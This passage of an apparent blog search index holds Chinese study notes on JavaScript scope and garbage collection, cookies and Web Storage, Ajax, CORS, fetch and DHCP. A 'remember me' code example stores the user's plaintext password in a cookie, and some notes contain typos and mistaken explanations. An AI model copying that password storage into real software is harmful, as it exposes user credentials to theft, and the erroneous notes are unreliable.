chain)，决定各级上下文代码访问变量、函数的顺序。正在执行的上下文位于堆栈最上面，其代码始终位于链条最前端；全局上下文变量始终位于链条最后面。执行标识符短路查找变量定义。上下文是函数，其活动对象（activation object）作为变量对象，最初只有一个定义变量argument；全局变量不包含。块作用域      未定义声明变量类型，同样可以使用到该变量 – 污染全局：可能修改到引用的文件内的变量        使用严格模式\"use strict\"要求必须声明        for没有块作用域，临时变量i定义使用var与全局变量同名时，将修改全局变量；推荐使用let声明，产生块级作用域        立即执行函数： 避免对全局变量的污染，强制在函数内部使用    花括号{}内使用let产生块级作用域· const 在同一作用域内不可改，函数内的局部作用域可再次声明var  存在变量声明提升的缺陷： 未声明可使用，就是没有定义；js 所有声明提到函数体顶部，赋值操作留在原来的位置  变量覆盖：多次声明定义无报错，使用最近定义的变量  没有块级作用域；是函数级作用域· var 声明的变量会保存到 Window 中，若与 Window 内已有全局对象同名，会修改到 DOM 的值const let  ！块级作用域，不存在变量提升  let 定义变量；  const 定义常量，声明时必须赋值，值和引用地址不可更改，引用的值可以改避免变量体现的缺陷，形成TDC 暂时性死区： 使用前必须先声明      变量名对内存地址的引用，引用不可更改；对象等同一个内存空间修改可以          修改变量值会重新开辟一个内存空间，相当于修改地址引用            同一作用域中 不可重复声明  冻结变量 Object.freeza· const 定义对象的内容可以改变，此时用到冻结变量const HOST = {  url: \"https://www..com/api\",  port: 442};Object.freeze(HOST);HOST.port = 80; //在严格模式下报错：重复声明共同点      函数中变量可访问到外部的全局变量（无论是哪种变量）        在块级作用域找不到时，往外查找定义  作用域链延长      try/catch 语句中的 catch块。   在catch语句之前，创建新变量对象，包含将要抛出的错误对象声明。        with 语句。   向作用域链前端添加指定对象    在IE8之前，catch捕捉到的错误添加到执行上下文的变量对象上，而不是catch语句的变量对象上，导致在catch外部也可以捕获到错误。回收机制​\tJavaScript的执行环境在代码执行期间管理内存：确定哪个变量不再使用，回收它并释放内存。周期性执行。​\t最主要的标记策略：标记清理和引用计数  回收对象 —— 当一个变量没有被其他变量或属性引用的时候          全局变量 ：持续到浏览器页面关闭      局部变量 ：函数执行结束后      数据存储      基本数据类型 —— 栈        引用数据类型 —— 堆，在栈中存储实际对象引用    当引用数据类型引用目标改变时，旧的栈实际对象失去引用，这变成需要回收的垃圾  两种常用方法​\t垃圾回收并不是实时的，因为开销比较大，所以垃圾回收器会周期性的释放程序中已经不在被引用的垃圾对象。浏览器常使用到两种标准策略：标记清理、引用计数#### 1. 标记清除法（大部分浏览器） Mark-Sweep两个阶段：      标记：从根节点遍历，给每个可访问的对象打上标记，表示对象可达    （标记打法可以是维护俩个“在不在上下文”的堆栈；也可以是活跃时反转某一位，不活跃时恢复）        清除：在没有可用分块空间时（或某个固定频率），对堆内存遍历，回收没有标记的对象（清除无引用对象）  优点：实现简单缺点：内存过于碎片化（标记-整理法）；分配速度慢（遍历）优化方案：**标记-整理法  Mark-Compact **​\t清除时对堆内存遍历时，先将被引用的对象移动到一起，然后再清理#### 2. 引用计数法 Reference counting​\t追踪每个变量被引用的次数，当引用为0时回收；（回收效率高）：  赋值给引用值时，引用数 +1；  保存引用的变量被覆盖了，引用数 -1缺点：a 计数器的增减处理频繁，会导致空间的使用效率降低。   b 循环引用无法收回，导致内存泄漏。3. 循环引用在IE9之前，涉及到COM对象（组件对象模型，Component Object Model），就无法避免 循环引用 的问题：  BOM 和 DOM 中对象是C++实现的COM对象，使用 引用计数 实现垃圾回收。即使引擎使用 标志清理，设计到COM对象依然可能形成循环引用，即使在页面中删除DOM元素内存也一样。   let element = document.getElementById('one'); // com对象   let obj = new Object() // 原生obj对象   obj.element = element;   element.obj = obj;      // 避免：确保两者没有联系   obj.element = null;   element.obj = null;在IE9之后，BOM 和 DOM 对象都变成了JavaScript对象，避免了循环引用问题，及常见的内存泄露问题。分代式垃圾回收机制  新生代：对象存活时间短，通常支持 1~8M  老生代：对象存储 存活时间长、常驻内存的对象两个内存区域回收频率不同，V8才有两个垃圾回收器管控：新生代垃圾回收​\tCheney算法，将堆内存分为两个区（semispace 半空间）：一个使用状态的空间我们称为使用区（From 空间）。一个处于闲置状态的空间称为空闲区（To 空间）垃圾回收机制——翻转 （Scavenge）  先对使用区中的活动做标记  标记完成后，将使用区的活动对象复制进空闲区并进行排序  将原先使用区对象占用的空间释放  最后进行角色互换，把空闲区变为使用区，使用区变为空闲区缺点：由于只能使用堆内存的一半，所以不适用大规模的垃圾回收机制中，是典型的牺牲空间换时间的算法。 —— 新生代内存空间较小、生命周期短（活对象少）并行回收Javascript是一门单线程语言，它是运行在主线程上的，而在进行垃圾回收的时候就会阻塞Javascript脚本的执行，需等待垃圾回收完毕后再恢复脚本执行，这种行为叫全停顿。那当GC时间过长就会造成页面卡顿问题。那一个人干活慢，n个人一起速度便会是一个人的n倍。程序也一样，我们可以通过并行回收机制：引入多个辅助线程来同时处理   新生代对象空间就采用并行策略。在垃圾回收过程中，启动多个线程来负责新生代中的垃圾清理，这些线程同时将对象空间中的数据移到空22由于这个过程中数据地址会发生改变，所以还需要同步更新引用这些对象的指针。新生代何时会到老生代  多次复制后依然存活的对象，可以认为是生命周期教强的对象，移到老生代管理  复制一个对象在空闲区时，占用空闲区空间的25%，则移到老生代管理 —— 当完成Scavenge回收，空间区变为使用区，会继续参与内存分配，比重过大影响后续内存分配老生代垃圾回收​\t老生代数据大多是存活的对象，不需要时常更新，可以使用 标记清收法 回收。在V8中使用 标记整理法 解决标记清除后产生的大量内存碎片。增量标记 （incremental marking）​\t代替 并行策略的全停顿式 的垃圾回收，节省清除较大对象的老生代的时间问题  一次GC分成多步小GC标记，让JS和小GC标记交替执行，直到标记完成。  应用逻辑执行一会，垃圾回收与应用逻辑交替执行直到标记阶段完成  存在问题：  ​\t小GC标记执行完后是如何暂停执行JS任务？—— 三色标记法  ​\t如何进行下一次小GC 标记？—— 惰性清理  ​\t如果执行JS任务时刚被标记好的对象引用又被修改了该当如何？ —— 写屏障三色标记法  黑色表示对象自身及对象的引用都被标记（已检查状态）  白色表示未被标记的对象（初始状态）  灰色表示自身被标记，自身的引用未被标记（待检查状态）执行流程：  初始所有对象都是白色  从root对象开始、标记为灰色，并推入标记工作表中；  当收集器从标记工作表中弹出对象，并访问它所有引用对象时，自身灰色就会变换成黑色  将自身的下一个引用对象标志为灰色一直执行，直到没有可以被标记为灰色的对象，剩下的白色对象都是不可达的，进入清除阶段；恢复时，从灰色标记对象开始执行写屏障目的：  解决黑色对象在程序执行中被新添加引用  已经标记黑色的被引用对象不再被引用了写屏障就有了以下两个变化：​\t1. 不对已标记的黑色对象做处理，因为在之后的GC中也会被清理。  Write-barrier 机制强制不变黑的对象指向白色对象。          这个也被称作强三色不变性。所以      一旦有黑色对象引用白色对象，该机制会强制将引用的白色对象改为灰色      从而保证下一次增量 GC 标记阶段可以正确标记      惰性清理 （lazy sweeping）​\t增量标记完后，如果当前内存足以支持代码的快速运行，也没必要立即清理，可让程序先运行，也无需一次性清理完所有垃圾对象，可以按需清理直到所有垃圾对象清理完后再继续增量标记。优化回收V8 script 隐藏类JS 性能优化 —– V8 隐藏类​\t“一次性声明”：避免生成不同的隐藏类，“先创建再补充”式动态属性赋值，并在构造函数中一次性声明所有属性​\t“置空不删除”：动态删除属性和新增属性一样，使得同一个构造函数出来的实例不再共享隐藏类。最佳方案是 = null优化程序回收，提高性能  手动回收（不建议）：window.ColloectGarbage()（IE）、window.opera.collect()（opera7以上）立即启动垃圾回收；  解除引用：将不需要的数据设置为null，释放其引用，在下次回收时释放内存。  使用 块级作用域 ，尽早让垃圾回收程序介入。"
  },
  
  {
    "title": "8. 网络请求鉴权",
    "url": "/posts/8.%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E9%89%B4%E6%9D%83/",
    "categories": "计算机网络, cookie, session, Storage, JWt",
    "tags": "computerNetwork",
    "date": "2022-06-27 00:00:00 +0800",
    





    
    "snippet": "存储​\t因为 HTTP是面向文本的，无连接、无状态的协议，所以需要 每次请求头部带上cookie，使服务器可以给不同用户匹配不同的内容HTTP cookie      基本概念:          由服务器端生成，发送给客户端浏览器      浏览器将这些数据保存至客户端的指定目录下的文本文件中                  这样在下一次访问相同的网站时可以直接使用该cookie数据。 ...",
    "content": "存储​\t因为 HTTP是面向文本的，无连接、无状态的协议，所以需要 每次请求头部带上cookie，使服务器可以给不同用户匹配不同的内容HTTP cookie      基本概念:          由服务器端生成，发送给客户端浏览器      浏览器将这些数据保存至客户端的指定目录下的文本文件中                  这样在下一次访问相同的网站时可以直接使用该cookie数据。          浏览器可以查询到cookie值，不安全                    “键-值”对(key-value pairs) 的形式保存的 key 和 value 都可以自定义      常见用于判断用户是否已登陆网站，或者保存购物车中等待付款的商品信息等。            用于处理单个事务，因为存在以下问题:          cookie的存储数据量小(4kb/个,只能保存50个)      cookie请求限制：每次浏览器与服务器进行请求时，cookie必须存放在请求头部传输到服务器端。            使用场景      cookie编码 &lt;form action=\"\"&gt;     &lt;label for=\"\"&gt;用户名&lt;/label&gt; &lt;input type=\"username\"&gt; &lt;br&gt;     &lt;label for=\"\"&gt;密码&lt;/label&gt; &lt;input type=\"password\"&gt; &lt;br&gt;     &lt;input type=\"checkbox\" id=\"remeberMe\"&gt; &lt;label for=\"remeberMe\"&gt;记住我&lt;/label&gt; &lt;br&gt;     &lt;input type=\"submit\" value=\"登录\"&gt;&lt;/form&gt;&lt;script&gt;    const username = document.querySelector('input[type=\"username\"]');    const password = document.querySelector('input[type=\"password\"]');    const checkbox = document.querySelector('input[type=\"checkbox\"]');    const submit = document.querySelector('input[type=\"submit\"]');    // cookie之间用 ; 分割，cookie内部用 = 分割    let array = document.cookie.split(';').map(cookie =&gt; cookie.split('='));    let cookie = {};    for (let i = 0; i &lt; array.length; i++) {        let name = array[i][0];  // 第一个值为 键        let value = array[i][1]; // 第二个值为 值        cookie[name] = decodeURIComponent(value); // 输入框的值经过编码，这里需要解码    }    // 若cookie内部存有值，加载页面完成后自动加载进去    if (document.cookie) {        username.value = cookie.yourname;        password.value = cookie.youpsw;        checkbox.checked = true;    }    // 提交按钮添加监听器    submit.addEventListener('click', e =&gt; {        if (checkbox.checked &amp;&amp; username.value != '') {            let key = 'yourname';            let value = encodeURIComponent(username.value); // 用户输入不可控，可能出现乱码，需要编码            let passTime = 2 * 24 * 60 * 60; // 设置保质期时间，单位是 s            document.cookie = `${key}=${value}; max-age=${passTime}`;        }        if(checkbox.checked &amp;&amp; password.value != '') {            let key = 'youpsw';            let value = encodeURIComponent(password.value);            let passTime = 2 * 24 * 60 * 60;            document.cookie = `${key}=${value}; max-age=${passTime}`;        }        e.preventDefault(); //取消一个目标元素的默认行为    });&lt;/script&gt;基于cookie的Session​\tsessionID生成、保存在服务器中，由服务器主导；使用cookie作为数据载体存放在浏览器中优点：👍 传递的session值，并不包含敏感信息（敏感信息存放到服务器中），相对安全，且值较小👍 sessionID 内部有指定的签名，非法修改过后服务器将无法识别而不提供服务👍 浏览器退出登录后，服务器内的session将会被删除；再拿着这个sessionId请求会话将无效缺点：👎 入侵者拿到SessionID后，可以合法时间内，伪装宿主的登录状态发送请求👎 特点时间大量用户访问服务器，服务器可能要面对存储大量SessionID的压力；👎 多台服务器需要分配用户时，每台服务器都需要通用的SessionID，才能避免用户多次输入数据登录，占用空间；使用数据库，若数据库出现问题，会影响服务器获取SessionID—— 解决办法：使用 JWTWeb存储  “键-值”对(key-value pairs)的形式存储在Web客户端(不常与服务器通信)  Web存储更适用于存储大量数据(5~10M)，  发生请求时不会带上Web存储的内容。浏览器支持的情况&lt;script&gt;\tif(window.localStorage[window.sessionStorage]){\t//浏览器支持Web存储中的localStorage/sessionStorage    // 值不为空\t}else{\t//浏览器不支持Web存储中的localStorage/sessionStorage\t}&lt;/script&gt;Storage接口​\tStorage接口实现数据的添加、修改、查询或删除。  StorageName.length：该只读属性返回值为整数形式，表示当前存储对象中“键-值”对的总数量  key(n)：用于返回数据中第n个值的名称。如果n大于所有键值对的总数，则返回null值。  getItem(key)：用于返回指定键名称的值，如果该名称不存在，则返回null值。  setItem(key，value)：用于设置一条自定义的”键值”对数据，如果该数据原先不存在，则会在存储对象的键值对列表中新增该数据；如果该数据的键名称原先存在，则看数据值是否有变化，如有变化则更新成最新值，否则不做任何操作。  removeItem(key)：用于删除存储对象中指定key名称的数据，如果没有则不做任何操作。  clear()：用于清空存储对象中的键值对列表，如果原先就无任何数据则不做任何操作。localStorage 和 sessionStorage共同点  优势          Storage拓展了cookie的4K限制      将第一次请求的数据直接存储到本地        局限          浏览器的大小不统一，并且在IE8以上的IE版本才支持      值类型限定为string类型，在JSON对象类型需要一些转换      浏览器的隐私模式下面是不可读取的      本质上是对字符串的读取，同步加载机制，如果存储内容多的话会消耗内存空间，会导致页面变卡      localStorage不能被爬虫抓取到      不同点  localStorage属于永久性存储  sessionStorage属于当会话结束的时候，键值对会被清空Storage 代码 span{     display:inline-block;     background-color: aqua;     margin-left: 5px;     width: 20px;     height: 20px;}&lt;input type=\"text\"&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;ul class=\"history\"&gt;&lt;/ul&gt;const text = document.querySelector('input[type=\"text\"]');const btn = document.querySelector('button');const history = document.querySelector('.history');if(localStorage.length &gt; 0){ // 加载完成时，加载local Session中的值    for( let i = 0; i&lt;localStorage.length; i++) {        // 给history添加li        let key = localStorage.key(i);        let li = document.createElement('li');         let liText = document.createTextNode(localStorage.getItem(key)); //创建一个 节点内容        li.appendChild(liText);        history.appendChild(li);        // 给li添加删除按钮        let close = document.createElement('span');        li.append(close);        close.addEventListener('click', () =&gt; {            localStorage.removeItem(key);            li.parentNode.removeChild(li); // li的父节点，删除这个li        })    }}btn.addEventListener('click', () =&gt;{    if( text.value){ // 输入框内容不为空        let key = new Date().valueOf(); // 时间对象，new的时间点，valueOf() 取其原始值，作为键值（不重复）        let value = text.value;        localStorage.setItem(key, value); // 添加localstrorage的方式        text.value = ''; // 初始化输入框        // 给history添加li        let li = document.createElement('li');        let liText = document.createTextNode(localStorage.getItem(key)); // 添加节点内容        li.appendChild(liText);        history.appendChild(li);        // 给li添加删除按钮        let close = document.createElement('span');        li.appendChild(close);        close.addEventListener('click', ()=&gt;{            localStorage.removeItem(key);            li.parentNode.removeChild(li);        })    }})属性和操作setItem 存储数据  以”健值对”的方式存放数据  setItem('key', 'value');可简写为localStorage.['key']= 'value';或者localStorage.key='value';  单双引号配合使用，表示话中有话getItem 读取指定数据  获取指定了键名称的数据值  getItem('name')可简写为localStorage.name(已知具体的键名称时方)  变量不可简写removeItem 数据遍历  Storage.removeItem('name')  彻底删除，包括数据的键名称和对应的值  如果提供的键名称无法匹配到已存储的数据信息，则本次不进行删除操作。clear 删除和清空Storage.clear();该方法不带任何参数，直接调用clear()可以清空整个localStorage或sessionStorage对象中的所有数据JWT​\tJSON Web Token使用场景​\ttoken是生成于服务器，但保存在浏览器中，由客户端主导一切（可以存放在cookie、session中）组成JTW -- header.payload.signatur\t\t算法.  数据.   签名  header：声明签名算法  payload： 存放有效信息数据  signature： 签证三者互相关联，修改任何一个，就会发送错误，安全性较高"
  },
  
  {
    "title": "7.发送网路请求",
    "url": "/posts/7.%E5%8F%91%E9%80%81%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/",
    "categories": "计算机网络, Ajax, 跨域, fetch, websocket",
    "tags": "computerNetwork",
    "date": "2022-06-20 00:00:00 +0800",
    





    
    "snippet": "发送网路请求Ajax 思想  Ajax全称为Asynchronous Javascript And XML，即异步JS和XML  通过Ajax可以在浏览器中向服务器发送异步请求，最大的优势：无刷新获取数据  AJAX不是新的编程语言，而是一种将现有的标准组合在一起使用的新方式优缺点:+1: 优点  可以无刷新页面与服务端进行通信  允许你根据用户事件来更新部分页面内容:-1: 缺点  没有浏...",
    "content": "发送网路请求Ajax 思想  Ajax全称为Asynchronous Javascript And XML，即异步JS和XML  通过Ajax可以在浏览器中向服务器发送异步请求，最大的优势：无刷新获取数据  AJAX不是新的编程语言，而是一种将现有的标准组合在一起使用的新方式优缺点:+1: 优点  可以无刷新页面与服务端进行通信  允许你根据用户事件来更新部分页面内容:-1: 缺点  没有浏览历史，不能回退  存在跨域问题（同源）  SEO（搜索引擎优化）不友好（爬虫获取不到信息）  存在安全问题：          要求验证请求发送者是否对资源有访问权限，可以通过以下方式实现：                  要求通过SSL访问能够比Ajax访问的资源          每个请求都发送一个按约定算法处理的令牌                    以下手段对防护CSRF攻击无效：                  对请求方式 POST、GET 的要求          对来源 URL 验证 （ URL可以伪造 ）          基于cookie 验证                    XML  实现Step1 — 创建 XMLHttpRequest 对象const xhr = new XMLHttpRequest();Step2 — 设置对象并发送  GET请求 — 【数据跟在url后面?分隔】 // 【get 请求】  xhr.open(\"GET\",\"url?t=\", isAsync); xht.sent(); // 将请求发送出去  POST请求 — 【数据在send中发送】 // 【post 请求】 xhr.open(\"POST\",\"url\", isAsync); xhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); //设置请求头 属性，值 xhr.send(\"fname=Henry&amp;lname=Ford\"); //在send中发送数据，服务端能够识别的任意数据      是否异步（第三个参数）                  Async=true                  在onreadystatechange 事件中，定义就绪状态时执行的函数                            Async=false                  会等到服务器响应就绪才继续执行。（不建议）          如果服务器繁忙或缓慢，应用程序会挂起或停止          不需要编写onreadystatechange 函数，直接将后续代码写在send后面                            readyStare 存有 XMLHttpRequest 的状态请求状态                  0: 请求未初始化          1: 服务器连接已建立          2: 请求已接收          3: 请求处理中          4: 请求已完成，且响应已就绪                每次readyState变化，都会触发onreadystatechange；        当响应码为2XX+readyStare时，表示响应已经就绪            xhr.onreadystatechange=function(){    if (xhr.readyState== 4 &amp;&amp; xhr.status&gt;=200 &amp;&amp; xhr.status &lt;300 )    {         xhr.status; // 状态码        xhr.ststusText; // 状态字符串        xhr.getAllResponseHeader(); // 所有响应头        xhr.response; // 响应体        document.getElementById(\"myDiv\").innerHTML=xmlhttp.responseText;    }}Step3 — 接受对象数据// 服务端const data = {name:'hello'};let str = JSON.stringify(data);response.send(str); // 转化过的JSON字符串// 客户端 1. 手动数据转化let data = JSON.parse(xhr.response);console.log(data);// 客户端 2.自动转化xhr.responseType = 'json'; // 配置的时候，设置响应类型result.innerHTML = xhr.response.name; // 自动解析后，可以直接使用请求超时  设置超时时间，中断请求const xhr = new XMLHttpRequest();xhr.timeout = 2000; // 响应超时时间  ms 单位xhr.ontimeout = function(){\t// 超时时，调用的函数}  手动取消请求const xhr = new XMLHttpRequest();xhr.abort();防止多次发送请求​\t减少重复发送的请求，减少服务器的压力let inSending = false;if(isSending) x.abort(); //请求正在发送，则取消该请求，创建一个新的；重复的请求已经发送成功,不允许重复操作const xhr = new XMLHttpRequest(); isSending = true; //请求正在处理 发送xhr.open(\"\",\"\",true);xhr.send();xhr.onreadystatechange = function(){\tif(xhr.readyState== 4 &amp;&amp; xhr.status&gt;=200 &amp;&amp; xhr.status &lt;300 ) isSending = true; //请求已经发送}跨域什么是跨域？ 同源策略同源策略（Same-Origin Policy）最早由 Netscape 公司提出，是浏览器的一种安全策略，防止一些恶意行为。违背同源策略就是跨域：同源：协议、域名、端口号 必须完全相同CORS​\tCORS (Cross-Origin Resource Sharing)，跨域资源共享。CORS 是官方的跨域解决方案，使用自定义的HTTP头部允许浏览器和服务器互相了解。  不需要在客户端做任何特殊的操作，完全在服务器中进行处理，支持 get 和 post 等请求  跨域资源共享标准新增了一组 HTTP 首部字段（响应头），允许服务器声明哪些源站通过浏览器有权限访问哪些资源          对于简单请求（GET、POST），没有自定义请求头，且请求体是text/plain类型，会在发送是加上额外的头部Origin:'发送请求的源'      /// 服务端设置响应头app.all('/cors',(Request,response)=&gt;{    response.setHeader(\"Access-Control-Allow-Origin\",\"*\")    // * 可以替换成服务端请求的 ‘协议、域名、端口号’})  如果请求没有头部、或头部源不匹配，服务器将不会处理、响应请求  如果服务器决定回应请求，在响应中发送Access-Control-Allow-Oring: '相同的源'或是 '*'  最好访问本地资源时使用相对URL；访问远程资源时使用绝对URL预检请求​\t🌟 服务器验证机制，符合以下要求的请求时，会先向服务器发送 “预检”请求，来确定服务器是否允许这种类型的请求  允许使用自定义头部  除GET、POST之外的方法  不同请求体内容类型​\t🌟 这个请求使用 OPTIONS方式发送，并包括以下头部  Origin：与简单请求相同  Access-Control-Request-Method：请求希望使用的方法  [Access-Control-Request-Headers]：自定义头部类别（逗号分隔）​\t🌟 服务器在响应头部返回这些信息  Access-Control-Allow-Origin：与简单请求相同  Access-Control-Allow-Method：允许请求的方法（逗号分隔）  Access-Control-Allow-Headers：允许的头部（逗号分隔）  Access-Control-Max-Age：缓存预检请求的秒数；（第一次请求才会多发生一次HTTP请求）凭据请求​\t默认情况下，跨源请求不提供凭据（ cookie , HTTP认证和客户端 SSL 证书）。​\t将withCredentials = true，浏览器表示请求会发送凭据、服务器在预检请求响应中发送表示这个源允许发送凭据请求​\t如果服务器允许带凭据的请求，那么可以在响应中包含如下HTTP头部：Access-Control-Allow-Credentials: true​\t如果发送了凭据请求而服务器返回的响应中没有这个头部，则浏览器不会把响应交给JavaScript (responseText是空字符串，status是0，onerror()被调用)。其他跨域解决方案​\t&lt;img&gt;、&lt;script&gt; 加载数据时，不会受到同源策略的限制。​\t&lt;img&gt;缺点是只能发送请求和推送数据，无法获取服务器响应内容。​\t&lt;script&gt; 缺点是无法对恶意响应进行拦截，不确定请求是否失败而做出中断请求的动作Axios 学习  功能强大的网络请求库,体积小  axios官网使用            [起步      Axios 中文文档      Axios 中文网 (axios-http.cn)](https://www.axios-http.cn/docs/intro)      页面引入\t&lt;script src=\"https://cdn.jsdelivr.net/npm/vue/dist/vue.js\"&gt;&lt;/script&gt;语法axios#get(url[, config])axios#post(url[, data[, config]])axios#delete(url[, config])axios#put(url[, data[, config]])axios#patch(url[, data[, config]])axios#options(url[, config])axios#request(config)axios#head(url[, config])get请求axios.get(\"地址?key=value&amp;key2=value2\").then(function(response){},function(err){})axios.get('/axios-server?t=', {    // url 参数    params: {},    //请求头信息    Headers: {}}).then(value =&gt; {    console.log(vale); // 自动转化为对象}).catch(err =&gt; {    console.log(err);})  get(url)请求  get().then(请求完成时触发(响应内容，``.catch`请求失败时触发(错误信息)  get(url?key=value&amp;key1=value1): key=value为参数, key为文档提供的，value为具体传输的数据post请求axios.post(\"地址\",{key=value&amp;key=value}).then(function(response){},function(err){})axios.post('/axios-server', {    //第二个参数是 数据}, {    //请求头信息    Headers: {}}).then(value =&gt; {    console.log(vale); // 自动转化为对象}).catch(err =&gt; {    console.log(err);})  post(地址,参数对象): {key=value}为参数对象AJAX请求axios({    methos:'post',    url:'/axios-server',    params:{}, // url 参数    Headers:{},    data:{} // 请求体 参数}).then(value =&gt; {    console.log(vale); // 自动转化为对象}).catch(err =&gt; {    console.log(err);})axios回调函数数据，解决:methods:{\tgetJoke:function(){\t\t// console.log(this.joke); 此时可以拿到this的数值\t\tvar that = this;\t\taxios.get(\"https://autumnfish.cn/api/joke\")\t\t\t.then(function(response){\t\t\t\t// console.log(this.joke); // 第二次调用时,joke=undefind\t\t\t\tconsole.log(response.data);\t\t\t\tthat.joke = response.data;\t\t\t},function(error){})\t\t\t}}  回调函数中的this已经改变,无法访问变量中的值,用that保持起来  和本地应用最大的区别时改变了数据的来源fetch 学习​\tfetch API提供了一个 JavaScript 接口，用于访问和操纵 HTTP 管道的一些具体部分，例如请求和响应。它还提供了一个全局 fetch() 方法，该方法提供了一种简单，合理的方式来跨网络异步获取资源。这种功能以前是使用 XMLHttpRequest 实现的。Fetch 提供了一个更理想的替代方案。  es6标准，浏览器提供的API  这是一个方法，不需要new，返回一个promise对象（必须是异步）  默认使用GET请求，发送POST请求需要 第二个参数配置  只关注发送请求和接收响应，而不关注响应时间、响应内容，需要手动配置📀 关于响应内容有效性的处理//  —— 只要存在响应，promise状态就是成功var fetch = fetch('http://example.com/movies.json',{    // 配置一个 promise 对象    method:'post',    body:JSON.stringify({}),    headers:{        'content-type': 'application/json'    }}).then(response =&gt; {    if(response.ok){        response.json; // 这里只考虑返回值为 json。        // response.headers.get('content-type').includes('application/json') 和 includes('text/html') 判断响应类型类型    }else {        // throw new Error('出现错误！网路请求失败')        return Promise.reject(response.json)    }})) // response对象，需要json处理后才可以访问.then(data =&gt; console.log(data)).catch(error =&gt; {});📀 关于响应时间过期请求的处理var oldFetchfn = fetch;window.fetch = function(input, opts){\tvar fetchPromise = oldFetchfn(input,opts); // 调用旧请求\tvar timeoutPromise = new Promise(function(resolve, reject){\t\tsetTimeout(()=&gt;{\t\t\treject(new Error('fetch tiomeout')); \t\t}, opts.timeout)\t});\treturn Promise.race([fetchPromise, timeoutPromise]); // 返回先改变状态的Promise}​\t仍然会发送请求到服务器，只是把超时的服务器响应丢弃掉；造成流量浪费。超时时间包括请求连接、服务器处理、服务器响应的所有请求时间。📀 中断请求 AbortController / AbortSignallet abortController = new AbortController();fetch('wikipeda.zip',{    signal: abortController.signal // 建立关联})setTimeout(()=&gt; AbortController.abort(),10) // 中断所有的请求// 当 abort() 被调用，fetch() promise 将会抛出一个 AbortError.Web Socket​\t通过建立一个长时连接实现与服务器全双工、双向的通信。 Web Socket 需要支持该协议的专用服务器，使用自定义协议，建立 安全连接。​\t优点：安全连接；客户端与服务器之间发送数据非常小的数据包，减少带宽压力和延迟问题。​\t缺点：协议定义时间比定义 JavaScriptAPI 时间长​​\tnew WebSocket(\"ws:// ....\")，必须传入一个绝对URL。不受同源策略的限制，可以打开到任意站点的连接，至于是否来自于特定源的页面通信，完全取决于服务器。​\t创建 Web Socket 时，一个 HTTP 请求会发送到服务器以建立初始化连接，建立成功后，HTTP 中的Upgrade头部协议切换到  Web Socket 协议，URL使用ws:// 和 wss://，且在指定  Web Socket URL必须包含URL方案。WebSocket 属性、方法、事件🎈属性`\twebSocket.readyState` 属性标识当前连接的状态：      WebSocket.OPENING —- 0： 正在建立连接        WebSocket.OPEN —– 1：连接已经建立    （socket.close()，关闭连接，任何时候都可以调用）        WebSocket.CLOSING —- 2 ：正在关闭连接        WebSocket.CLOSE —- 3：连接已经关闭  🎈方法socket.send(String/ArrayBuffer/Blob)： 向服务器发送数据socket.message = function(event)： 接收服务器消息  有效荷载存放在 event.data 中  WebSocket.binaryType = blob/arraybuffer，表示数据可以是Blob/ArrayBuffer🎈事件      open：连接成功时触发        error：发送错误时触发，连接无法存续        close：连接关闭时触发。事件event对象有额外信息：          wasClean 表示连接是否干净关闭；      code 服务器数据状态码；      reason 字符串，包含服务器传来的消息        WebSocket 对象不支持 DOM Level 2 事件监听。需要使用 DOM0 事件处理程序。  Beacon API​\t为保证某些工具脚本能够在页面生命周期中尽量晚地向服务器发送遥测或分析数据 —— 最好的时机是页面卸载时 onunload，此时用户离开页面，也意味着不会再产生新的行为数据；但此时 异步XMLHttpRequest 或 Fetch 并不适合这个问题，因为浏览器卸载页面时会取消任何异步请求 —— W3C 提出 Beacon API。// navigator.sendBeacon( URL, 数据有效负载 ），发送POST请求// 数据有效负载类型，可以是 Array、Blob、DOMString、FormData// 返回值：true 成功进入最终发送的任务队列；falsenavigator.sendBeacon('https:// ...', '{foo:\"bar\"}');​\tsendBeacon()不仅在页面生命周期末尾使用，任何时候都可以使用；​\t浏览器保证原始页面已经关闭情况下，也会发送请求；​\tBeacon（信标）请求会携带调用sendBeacon()时所有相关的cookie"
  },
  
  {
    "title": "6.网络层",
    "url": "/posts/6.%E7%BD%91%E7%BB%9C%E5%B1%82/",
    "categories": "计算机网络",
    "tags": "computerNetwork",
    "date": "2022-06-18 00:00:00 +0800",
    





    
    "snippet": "​\t网络体系结构的最顶层，享受下层提供的服务，无视下层具体操作活动；​\t通过应用进程的交互，实现特定网络应用的问题；​\t是设计和建立计算机网络的最终目的C/S 和 P2PC/S客户 / 服务器（Client/Server）  客户：是计算机、是进程，是服务请求方  服务器：          是计算机、是进程，是服务提供方      总是处于运行状态，等待客户请求      具有固定的端口号...",
    "content": "​\t网络体系结构的最顶层，享受下层提供的服务，无视下层具体操作活动；​\t通过应用进程的交互，实现特定网络应用的问题；​\t是设计和建立计算机网络的最终目的C/S 和 P2PC/S客户 / 服务器（Client/Server）  客户：是计算机、是进程，是服务请求方  服务器：          是计算机、是进程，是服务提供方      总是处于运行状态，等待客户请求      具有固定的端口号，主机有固定的IP地址        服务集中型          应用服务集中 比客户端少得多的 服务器上      常会出现服务器跟不上客户端请求的情况      计算机群集（服务器场）构建一个强大的虚拟服务器      P2P对等方式 （ Peer - to - Peer）  没有固定的请求者和提供者，应用进程对等、直接通信  服务分散型          大量对等计算机都是服务的提供和请求者      可扩展性：不会因为规模扩大而减低系统性能        用户越多，速度越快；成本优势DHCP​\t动态主机配置协议，又称为即插即用网络。​\t允许一台计算机加入新网络时，可以自动获取IP地址等网络配置信息而不用手工配置。​\tTCP/IP的应用层协议，使用UDP传输​\tDHCP\t服务器的端口67；客户端的端口68工作过程      *discover ** *寻找服务器    客户端 发送UDP用户数据报，包含DHCP发现报文；          目的地址255.255.255.255：不知道当前网络中有多少个DHCP服务端，和他们具体的IP      源地址0.0.0.0：当前主机未分配到IP地址      目的端口号67：非DHCP服务器不监视该端口，收到但丢弃；仅DHCP服务器作出回复      数据域封装有 事务ID + DHCP客户端的MAC地址            Offer 提供一套方案    DHCP服务器收到该报文，          拆分、查找是否有针对其MAC地址的配置信息                  有：将该配置信息封装 → DHCP提供报文          无：默认配置信息封装 → DHCP提供报文                    封装回复报文                  目的地址：255.255.255.255，目标设备未分配到IP地址          源地址：DHCP服务器地址          目的端口号68：非DHCP客户端不监视该接口，收到但丢弃；仅DHCP客户端作出回复                          Request 确认选择某一套方案    客户端收到回复：          根据报文中的事务ID判断是否是自己所请求的报文      